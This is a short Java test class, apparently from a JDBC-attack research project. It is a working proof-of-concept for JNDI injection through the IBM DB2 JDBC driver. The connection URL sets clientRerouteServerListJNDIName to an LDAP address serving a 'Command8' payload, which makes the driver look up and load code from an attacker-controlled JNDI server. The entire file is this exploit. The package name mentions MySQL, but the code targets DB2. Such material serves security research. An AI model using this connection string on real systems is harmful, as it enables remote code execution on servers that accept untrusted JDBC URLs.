package org.su18.jdbc.attack.mysql;

import java.sql.DriverManager;

/**
 * 使用 https://github.com/su18/JNDI 进行测试
 * 驱动名称 com.ibm.db2.jcc.DB2Driver
 * 属性名 clientRerouteServerListJNDIName
 * 连接参数 :clientRerouteServerListJNDIName=ldap://127.0.0.1:23457/Command8;
 *
 * @author su18
 */
public class AttackTest {

	public static void main(String[] args) throws Exception {
		// 注册驱动
		Class.forName("com.ibm.db2.jcc.DB2Driver");

		DriverManager.getConnection("jdbc:db2://127.0.0.1:5001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:23457/Command8;");
	}

}
